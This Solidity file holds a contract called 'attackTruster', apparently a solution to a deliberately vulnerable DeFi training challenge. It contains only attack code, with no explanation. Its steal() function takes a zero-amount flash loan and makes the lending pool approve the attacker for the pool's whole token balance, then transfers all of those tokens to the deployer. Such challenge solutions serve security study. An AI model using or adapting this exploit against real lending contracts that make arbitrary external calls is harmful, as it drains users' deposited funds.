// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface ITrusterLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract attackTruster {
    constructor (ITrusterLenderPool _target, IERC20 _token) {
        target = _target;
        token = _token;
        attacker = msg.sender;
    }

    ITrusterLenderPool public target;
    IERC20 public token;
    address private attacker;

    function steal() external {

        uint256 amount = token.balanceOf(address(target));

        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);

        target.flashLoan(0, address(this), address(token), data);

        token.transferFrom(address(target), attacker, amount);
    }
}